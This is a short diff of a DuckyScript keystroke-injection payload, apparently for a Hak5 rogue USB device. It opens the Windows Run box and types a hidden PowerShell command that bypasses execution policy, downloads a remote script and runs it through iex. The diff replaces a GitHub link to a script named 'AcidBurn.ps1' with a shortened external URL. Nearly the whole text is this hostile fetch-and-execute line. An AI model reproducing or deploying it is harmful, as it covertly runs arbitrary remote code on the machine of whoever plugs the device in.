@@ -12,5 +12,5 @@ REM     ------------------------------------------------------------------------
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-AcidBurn/AcidBurn.ps1?dl=1 | iex
+STRING powershell -w h -NoP -NonI -Ep Bypass iwr https://jakoby.lol/zyg | iex
 ENTER
